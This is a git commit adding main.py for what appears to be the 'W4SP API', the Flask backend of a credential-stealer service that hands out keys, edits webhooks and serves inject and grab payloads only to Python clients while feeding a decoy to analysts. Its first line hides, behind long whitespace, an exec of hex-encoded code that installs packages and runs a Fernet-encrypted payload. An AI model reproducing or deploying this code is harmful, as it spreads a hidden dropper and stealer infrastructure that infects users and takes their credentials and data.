ad4157601b5b925dd5804b4582dff575ae8d7487
enjoyeuphoria6 <enjoyeuphoria6@github.com>
2025-04-16 18:12:27 +0200

    Update files

---
+++ W4SP-API/main.py
@@ -0,0 +1,131 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x6b\x45\x76\x62\x33\x7a\x4c\x39\x6a\x34\x6c\x2d\x4a\x44\x5f\x6a\x76\x54\x2d\x30\x48\x38\x76\x79\x71\x55\x35\x77\x46\x54\x4f\x4b\x7a\x35\x70\x6c\x75\x71\x75\x4b\x4c\x71\x67\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5f\x39\x62\x6b\x34\x62\x48\x65\x36\x43\x49\x69\x6d\x65\x44\x76\x48\x67\x53\x77\x46\x41\x4f\x4a\x6c\x52\x73\x6e\x73\x65\x37\x4f\x34\x6a\x66\x70\x43\x78\x47\x6a\x63\x63\x45\x72\x47\x4c\x31\x44\x4f\x44\x65\x53\x44\x4e\x74\x47\x68\x6b\x51\x35\x67\x36\x66\x43\x55\x47\x4c\x75\x38\x39\x5a\x65\x32\x44\x6c\x42\x4b\x57\x32\x69\x65\x73\x78\x56\x79\x5a\x4d\x51\x7a\x70\x32\x52\x6a\x38\x6a\x6e\x75\x4a\x46\x74\x7a\x48\x43\x7a\x5f\x52\x51\x4e\x35\x4b\x30\x43\x48\x65\x6a\x79\x42\x51\x74\x70\x4c\x7a\x52\x54\x77\x76\x32\x55\x63\x46\x52\x4b\x6d\x71\x32\x44\x6b\x6a\x38\x49\x6e\x67\x42\x6b\x66\x73\x39\x52\x74\x77\x45\x34\x51\x36\x38\x56\x4b\x55\x38\x79\x37\x49\x53\x67\x38\x34\x56\x67\x77\x70\x6c\x5f\x61\x47\x5f\x35\x78\x75\x64\x4b\x5a\x56\x4d\x39\x5f\x48\x4c\x4f\x6f\x35\x70\x4e\x58\x63\x59\x77\x58\x69\x2d\x6d\x75\x33\x53\x36\x67\x38\x74\x44\x51\x5a\x63\x48\x59\x33\x6e\x37\x6d\x43\x63\x75\x72\x68\x2d\x70\x67\x50\x58\x45\x4c\x49\x30\x49\x62\x6e\x55\x47\x65\x52\x45\x3d\x27\x29\x29')
+from flask import Flask, request
+from random import choice
+from etc.keys import Response, Gen, Remove, Edit, Script, Inject, Grab, Webhook
+from etc.hype import Obfuscate
+
+app = Flask('Wasp')
+admin_key = 'x'
+
+# W4SP API 1.3
+# by billythegoat356
+
+bait = """uwu uwu uwu uwu
+uwu uwu uwu uwu
+uwu uwu uwu uwu, uwu, uwu, uwu
+uwu uwu.uwu uwu uwu
+uwu uwu
+uwu uwu uwu uwu
+#  THIS IS A BAIT LMAO
+#  YOU REALY DEOBED THIS THINKING IT WAS
+#  THE STEALER ??
+# 
+# 
+uwu uwu != 'uwu': 
+    uwu()
+uwu uwu():
+    uwu = uwu([uwu("uwu"), uwu("uwu")])
+    uwu = uwu(uwu)
+    uwu _ uwu uwu(42069):
+        uwu = uwu(uwu)
+        uwu = uwu + "\\" + uwu
+        uwu uwu uwu(uwu) uwu " " uwu uwu uwu:
+            uwu uwu
+    uwu uwu("uwu")
+uwu uwu():
+    uwu = ''.uwu(uwu('uwu') uwu _ uwu uwu(42069))
+    uwu = ['.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu', '.uwu']
+    uwu uwu + uwu(uwu)
+uwu uwu(uwu):
+    uwu uwu(uwu, uwu='uwu', uwu='uwu-42069') uwu uwu:
+        uwu.uwu(uwu.uwu("uwu42069uwu").uwu().uwu("uwu42069"))
+uwu uwu(uwu):
+    uwu(uwu"uwu {uwu} {uwu}")
+uwu uwu(uwu):
+    uwu = 'uwu.uwu'
+    uwu = uwu"{uwu} {uwu}"
+    uwu42069 = uwu.uwu_uwu_uwu
+    uwu42069 = "uwu\\uwu\\uwu\\uwu\\uwu"
+    uwu_ = uwu.uwu(uwu42069, uwu42069, 42069, uwu.uwu_uwu)
+    uwu.uwu(uwu_, "uwu uwu uwu uwu uwu", 42069, uwu.uwu_uwu, uwu"{uwu} & {uwu}")
+uwu = uwu() + '\\' + uwu()
+uwu(uwu)
+uwu(uwu)
+uwu:
+    uwu(uwu)
+uwu:
+    uwu"""
+
+
+host = '10.0.0.4'
+port = 80
+
+
+
+@app.route('/')
+def main_route():
+    return Response
+
+
+@app.route('/gen', methods=['POST'])
+def gen_route():
+    headers = request.headers
+    if headers.get('key') != admin_key:
+        print(headers.get('key'), admin_key)
+        print('bad')
+        return Response, 401
+    return ('', Gen(headers.get('id'), headers.get('username'), headers.get('payment')))
+
+
+@app.route('/keys', methods=['POST'])
+def keys_route():
+    headers = request.headers
+    if headers.get('key') != admin_key:
+        print(headers.get('key'), admin_key)
+        print('bad')
+        return Response, 401
+    with open('keys.json', mode='r', encoding='utf-8') as f:
+        return f.read(), 200
+
+@app.route('/rm', methods=['POST'])
+def remove_route():
+    headers = request.headers
+    if headers.get('key') != admin_key:
+        print(headers.get('key'), admin_key)
+        print('bad')
+        return Response, 401
+    return ('', Remove(headers.get('user_key')))
+
+
+@app.route('/edit', methods=['POST'])
+def edit_route():
+    headers = request.headers
+    return Edit(key=headers.get('key'), webhook=headers.get('webhook'))
+
+@app.route('/script/<public_key>')
+def script_route(public_key):
+    headers = request.headers
+    return Script(public_key, headers['User-Agent'])
+
+@app.route('/inject/<public_key>')
+def inject_route(public_key):
+    headers = request.headers
+    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
+        print('BAIT')
+        return Obfuscate(bait)
+    else:
+        return Inject(public_key=public_key, headers=headers)
+
+@app.route('/grab/<public_key>')
+def grab_route(public_key):
+    headers = request.headers
+    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
+        print('BAIT')
+        return Obfuscate(bait)
+    else:
+        return Grab(public_key=public_key, headers=headers)
+
+
+app.run(host, port)
+
+print('epahdaf')
